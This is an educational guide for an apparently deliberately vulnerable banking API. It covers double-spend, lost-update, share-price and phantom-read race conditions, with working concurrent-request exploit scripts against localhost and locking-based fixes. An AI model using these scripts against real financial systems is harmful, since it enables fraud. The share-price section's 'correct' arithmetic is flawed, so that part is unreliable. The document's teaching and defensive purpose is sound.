# Race Conditions in Racing Bank

## Overview

This document provides detailed examples of the race condition vulnerabilities intentionally included in the Racing Bank API for educational purposes.

## ⚠️ Important Note

All vulnerabilities described here are **intentional** and included for **educational purposes only**. Do NOT use this code in production systems.

---

## Example 1: Double Spending Attack

### Description
The most critical vulnerability - allows spending the same money multiple times through concurrent transfer requests.

### Vulnerable Code Pattern
The transfer endpoint checks balance and executes transfer without proper locking:

```python
# Vulnerable code (simplified)
def transfer(from_user, to_user, amount):
    # Check balance
    if from_user.balance >= amount:  # Race condition here!
        # Deduct from sender
        from_user.balance -= amount
        # Add to receiver
        to_user.balance += amount
```

### Attack Scenario
1. Alice has $100 in her account
2. Alice initiates two simultaneous transfers of $80 each
3. Both requests check the balance ($100 >= $80) ✓
4. Both requests execute the transfer
5. **Result**: Alice has -$60, Bob received $160!

### Exploitation

**Using curl (multiple terminals)**:
```bash
# Terminal 1
curl -X POST http://localhost:8000/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to_username": "bob", "amount": 80}' &

# Terminal 2 (execute immediately)
curl -X POST http://localhost:8000/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"to_username": "bob", "amount": 80}' &
```

**Using Python**:
```python
import concurrent.futures
import requests

def transfer(token, to_user, amount):
    return requests.post(
        "http://localhost:8000/transfer",
        headers={"Authorization": f"Bearer {token}"},
        json={"to_username": to_user, "amount": amount}
    )

# Execute two concurrent transfers
with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
    future1 = executor.submit(transfer, token, "bob", 80)
    future2 = executor.submit(transfer, token, "bob", 80)
    
    result1 = future1.result()
    result2 = future2.result()
```

### Expected vs Actual Results

| Scenario | Expected | Actual (Vulnerable) |
|----------|----------|---------------------|
| Initial balance | $100 | $100 |
| After 2x $80 transfers | Reject 2nd transfer | Both succeed |
| Final balance | $20 | -$60 (overdraft!) |

### How to Fix (Production)

**Option 1: Pessimistic Locking**
```python
from sqlalchemy import select

def transfer(session, from_user_id, to_user_id, amount):
    with session.begin():
        # Lock rows for update
        from_user = session.execute(
            select(User).where(User.id == from_user_id).with_for_update()
        ).scalar_one()
        
        if from_user.balance >= amount:
            from_user.balance -= amount
            
            to_user = session.execute(
                select(User).where(User.id == to_user_id).with_for_update()
            ).scalar_one()
            to_user.balance += amount
            
            session.commit()
        else:
            raise InsufficientFundsError()
```

**Option 2: Optimistic Locking**
```python
class User:
    id = Column(Integer, primary_key=True)
    balance = Column(Numeric(10, 2))
    version = Column(Integer, default=0)  # Version number

def transfer(session, from_user_id, to_user_id, amount):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            from_user = session.query(User).filter_by(id=from_user_id).one()
            current_version = from_user.version
            
            if from_user.balance >= amount:
                # Update only if version hasn't changed
                result = session.execute(
                    update(User)
                    .where(User.id == from_user_id)
                    .where(User.version == current_version)
                    .values(
                        balance=User.balance - amount,
                        version=User.version + 1
                    )
                )
                
                if result.rowcount == 0:
                    # Version changed, retry
                    session.rollback()
                    continue
                    
                # Update recipient
                session.execute(
                    update(User)
                    .where(User.id == to_user_id)
                    .values(balance=User.balance + amount)
                )
                
                session.commit()
                return
            else:
                raise InsufficientFundsError()
        except Exception:
            session.rollback()
            if attempt == max_retries - 1:
                raise
```

---

## Example 2: Lost Updates in Deposits

### Description
Concurrent deposits can overwrite each other, causing money to disappear.

### Vulnerable Code Pattern
```python
def deposit(user, amount):
    current_balance = user.balance  # Read
    new_balance = current_balance + amount  # Calculate
    user.balance = new_balance  # Write (race condition!)
    session.commit()
```

### Attack Scenario
1. Account has $100
2. Two deposits of $50 each are made simultaneously
3. Both read $100 as current balance
4. Both calculate new balance as $150
5. Both write $150 as final balance
6. **Result**: Only one deposit is recorded! Lost $50!

### Exploitation

**Using Python**:
```python
import concurrent.futures
import requests

def deposit(token, amount):
    return requests.post(
        "http://localhost:8000/deposit",
        headers={"Authorization": f"Bearer {token}"},
        json={"amount": amount}
    )

# Execute 10 concurrent deposits of $10 each
# Expected final balance: +$100
# Actual: Much less due to lost updates

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(deposit, token, 10) for _ in range(10)]
    results = [f.result() for f in futures]

# Check final balance - will be less than expected
```

### Timeline of Lost Update

```
Time  | Thread 1          | Thread 2          | Database
------|-------------------|-------------------|----------
T0    | Read: $100        |                   | $100
T1    |                   | Read: $100        | $100
T2    | Calculate: $150   |                   | $100
T3    |                   | Calculate: $150   | $100
T4    | Write: $150       |                   | $150
T5    |                   | Write: $150       | $150 (lost update!)
```

### How to Fix (Production)

**Option 1: Atomic Updates**
```python
def deposit(session, user_id, amount):
    # Use database-level atomic operation
    result = session.execute(
        update(User)
        .where(User.id == user_id)
        .values(balance=User.balance + amount)
    )
    session.commit()
    return result
```

**Option 2: Serializable Isolation**
```python
def deposit(session, user_id, amount):
    session.connection(execution_options={
        "isolation_level": "SERIALIZABLE"
    })
    
    user = session.query(User).filter_by(id=user_id).one()
    user.balance += amount
    session.commit()
```

---

## Example 3: Fund Share Price Manipulation

### Description
Multiple simultaneous subscriptions can use stale share prices, creating accounting inconsistencies.

### Vulnerable Code Pattern
```python
def subscribe_to_fund(user, amount):
    fund = get_fund()  # Get current fund data
    share_price = calculate_share_price(fund)  # Race condition!
    shares = amount / share_price
    
    user.cash_balance -= amount
    user.fund_balance += shares
    fund.total_value += amount
```

### Attack Scenario
1. Fund has $10,000 total, 100 shares outstanding = $100/share
2. Five users simultaneously subscribe with $1,000 each
3. All five read the same share price ($100)
4. All five calculate 10 shares each
5. All five transactions commit
6. **Result**: Fund has $15,000 but issued 50 shares (should be ~42.86 shares)

### Exploitation

```bash
# Using multiple user tokens
for i in {1..5}; do
  curl -X POST http://localhost:8000/subscribe \
    -H "Authorization: Bearer $TOKEN_USER_$i" \
    -H "Content-Type: application/json" \
    -d '{"amount": 1000}' &
done

# Wait for all to complete
wait

# Check fund info - math won't add up!
curl http://localhost:8000/fund/info
```

### Accounting Inconsistency

| User | Read Price | Amount | Shares Received |
|------|-----------|--------|-----------------|
| User 1 | $100/share | $1,000 | 10 shares |
| User 2 | $100/share | $1,000 | 10 shares |
| User 3 | $100/share | $1,000 | 10 shares |
| User 4 | $100/share | $1,000 | 10 shares |
| User 5 | $100/share | $1,000 | 10 shares |
| **Total** | - | **$5,000** | **50 shares** |

**Correct calculation**: 
- Start: $10,000 / 100 shares = $100/share
- After $5,000 added: $15,000 / 142.86 shares = $105/share
- User 1 should get: $1,000 / $100 = 10.00 shares
- User 2 should get: $1,000 / $104.76 = 9.55 shares
- And so on... total should be ~42.86 new shares, not 50!

### How to Fix (Production)

**Option 1: Row-Level Locking**
```python
def subscribe_to_fund(session, user_id, amount):
    with session.begin():
        # Lock the fund row
        fund = session.query(Fund).with_for_update().one()
        
        # Calculate price with locked data
        share_price = fund.total_value / fund.total_shares
        shares = amount / share_price
        
        # Update user
        user = session.query(User).with_for_update().filter_by(id=user_id).one()
        if user.cash_balance < amount:
            raise InsufficientFundsError()
            
        user.cash_balance -= amount
        user.fund_balance += shares
        
        # Update fund
        fund.total_value += amount
        fund.total_shares += shares
        
        session.commit()
```

**Option 2: Sequential Processing with Queue**
```python
# Use message queue to serialize fund operations
import redis
from rq import Queue

q = Queue(connection=redis.Redis())

def process_subscription(user_id, amount):
    # This function runs sequentially
    with session.begin():
        fund = session.query(Fund).one()
        share_price = fund.total_value / fund.total_shares
        shares = amount / share_price
        
        user = session.query(User).filter_by(id=user_id).one()
        user.cash_balance -= amount
        user.fund_balance += shares
        
        fund.total_value += amount
        fund.total_shares += shares
        
        session.commit()

# Enqueue subscription requests
job = q.enqueue(process_subscription, user_id, amount)
```

---

## Example 4: Phantom Reads in Statements

### Description
Transaction statements can show inconsistent data when queried during concurrent operations.

### Vulnerable Code Pattern
```python
def get_statement(user_id):
    transactions = session.query(Transaction).filter_by(user_id=user_id).all()
    balance = session.query(User).filter_by(id=user_id).one().balance
    return {
        "transactions": transactions,
        "current_balance": balance  # May not match transaction sum!
    }
```

### Attack Scenario
1. User requests statement
2. Concurrent transfer occurs mid-query
3. Statement shows transactions but old balance
4. User sees inconsistent data

### How to Fix (Production)
```python
def get_statement(session, user_id):
    # Use consistent snapshot
    session.connection(execution_options={
        "isolation_level": "REPEATABLE_READ"
    })
    
    transactions = session.query(Transaction).filter_by(user_id=user_id).all()
    balance = session.query(User).filter_by(id=user_id).one().balance
    
    return {
        "transactions": transactions,
        "current_balance": balance
    }
```

---

## Testing Race Conditions

### Manual Testing with Apache Bench

```bash
# Install Apache Bench
sudo apt-get install apache2-utils

# Create request body
echo '{"to_username": "bob", "amount": 50}' > transfer.json

# Execute concurrent requests
ab -n 100 -c 10 -m POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -p transfer.json \
  http://localhost:8000/transfer
```

### Automated Testing Script

```python
# test_race_conditions.py
import pytest
import requests
import concurrent.futures
from decimal import Decimal

BASE_URL = "http://localhost:8000"

def test_double_spending():
    """Test that concurrent transfers can overdraft account"""
    # Setup: Get user with $100
    token = get_auth_token("alice", "alice123")
    
    # Get initial balance
    response = requests.get(
        f"{BASE_URL}/balance",
        headers={"Authorization": f"Bearer {token}"}
    )
    initial_balance = Decimal(response.json()["cash_balance"])
    
    # Execute two concurrent transfers of $80
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        future1 = executor.submit(transfer, token, "bob", 80)
        future2 = executor.submit(transfer, token, "charlie", 80)
        
        result1 = future1.result()
        result2 = future2.result()
    
    # Get final balance
    response = requests.get(
        f"{BASE_URL}/balance",
        headers={"Authorization": f"Bearer {token}"}
    )
    final_balance = Decimal(response.json()["cash_balance"])
    
    # Assertion: Balance should be negative (vulnerability)
    assert final_balance < 0, "Double spending vulnerability not present"
    assert final_balance == initial_balance - 160


def test_lost_updates():
    """Test that concurrent deposits lose updates"""
    token = get_auth_token("alice", "alice123")
    
    # Get initial balance
    response = requests.get(
        f"{BASE_URL}/balance",
        headers={"Authorization": f"Bearer {token}"}
    )
    initial_balance = Decimal(response.json()["cash_balance"])
    
    # Execute 10 concurrent deposits of $10
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(deposit, token, 10) for _ in range(10)]
        results = [f.result() for f in futures]
    
    # Get final balance
    response = requests.get(
        f"{BASE_URL}/balance",
        headers={"Authorization": f"Bearer {token}"}
    )
    final_balance = Decimal(response.json()["cash_balance"])
    
    expected = initial_balance + 100
    # Assertion: Final balance should be less than expected (lost updates)
    assert final_balance < expected, "Lost updates vulnerability not present"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
```

---

## Database Isolation Levels

Understanding isolation levels is key to fixing these issues:

| Isolation Level | Dirty Reads | Non-Repeatable Reads | Phantom Reads | Performance |
|----------------|-------------|----------------------|---------------|-------------|
| READ UNCOMMITTED | ❌ Possible | ❌ Possible | ❌ Possible | ⚡⚡⚡ Fast |
| READ COMMITTED | ✅ Prevented | ❌ Possible | ❌ Possible | ⚡⚡ Medium |
| REPEATABLE READ | ✅ Prevented | ✅ Prevented | ❌ Possible | ⚡ Slower |
| SERIALIZABLE | ✅ Prevented | ✅ Prevented | ✅ Prevented | 🐌 Slowest |

**Racing Bank uses**: No explicit isolation (default READ COMMITTED) - most vulnerable!

**Production should use**: REPEATABLE READ or SERIALIZABLE for financial transactions

---

## Summary of Vulnerabilities

| Vulnerability | Impact | Severity | Fix Complexity |
|--------------|--------|----------|----------------|
| Double Spending | Money created from nothing | 🔴 Critical | Medium |
| Lost Updates | Money disappears | 🔴 Critical | Low |
| Share Price Manipulation | Accounting errors | 🟡 High | Medium |
| Phantom Reads | Inconsistent reports | 🟢 Medium | Low |

---

## Learning Resources

- [OWASP: Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_condition)
- [PostgreSQL Transaction Isolation](https://www.postgresql.org/docs/current/transaction-iso.html)
- [MySQL InnoDB Locking](https://dev.mysql.com/doc/refman/8.0/en/innodb-locking.html)
- [Distributed Systems: Consistency](https://jepsen.io/consistency)

---

**Remember**: These vulnerabilities are intentional for educational purposes. Always implement proper locking, transactions, and isolation levels in production systems!